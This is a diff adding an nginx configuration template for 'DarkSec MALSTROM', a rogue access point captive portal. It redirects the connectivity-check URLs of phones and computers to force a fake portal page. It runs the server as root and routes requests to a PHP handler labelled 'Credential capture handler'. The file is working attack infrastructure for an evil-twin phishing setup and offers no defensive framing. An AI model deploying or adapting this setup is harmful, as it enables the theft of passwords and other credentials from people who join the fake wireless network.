@@ -1,0 +1,66 @@
+# DarkSec MALSTROM — nginx captive portal config (generated template)
+# __MALSTROM_PAYLOAD_DIR__  -> payload root
+# __MALSTROM_PORTAL_IP__    -> portal/rogue AP IP (e.g. 172.16.52.1)
+# __MALSTROM_FPM_SOCK__     -> php-fpm socket path
+
+user root root;
+worker_processes 1;
+error_log /tmp/malstrom_nginx_error.log;
+pid /var/run/nginx.pid;
+
+events {
+    worker_connections 1024;
+}
+
+http {
+    include /etc/nginx/mime.types;
+    default_type text/html;
+    sendfile on;
+    keepalive_timeout 65;
+
+    server {
+        listen 80 default_server;
+        server_name _;
+
+        root __MALSTROM_PAYLOAD_DIR__/www_portal;
+        index index.php index.html;
+
+        # Captive portal detection endpoints — non-standard response signals
+        # to the OS that a portal exists, redirect to portal root.
+        location = /generate_204 { return 302 http://$host/; }
+        location = /gen_204 { return 302 http://$host/; }
+        location = /connecttest.txt { return 302 http://$host/; }
+        location = /success.txt { return 302 http://$host/; }
+        location = /hotspot-detect.html { return 302 http://$host/; }
+        location = /canonical.html { return 302 http://$host/; }
+        location = /library/test/success.html { return 302 http://$host/; }
+
+        # Credential capture handler — deployed to www_portal/captiveportal/
+        location /captiveportal/ {
+            alias __MALSTROM_PAYLOAD_DIR__/www_portal/captiveportal/;
+            index index.php;
+            location ~ \.php$ {
+                fastcgi_pass unix:__MALSTROM_FPM_SOCK__;
+                fastcgi_index index.php;
+                include /etc/nginx/fastcgi_params;
+                fastcgi_param SCRIPT_FILENAME $request_filename;
+            }
+        }
+
+        location ~ \.php$ {
+            fastcgi_pass unix:__MALSTROM_FPM_SOCK__;
+            fastcgi_index index.php;
+            include /etc/nginx/fastcgi_params;
+            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        }
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        error_page 404 = @fallback;
+        location @fallback {
+            rewrite ^ /index.php last;
+        }
+    }
+}
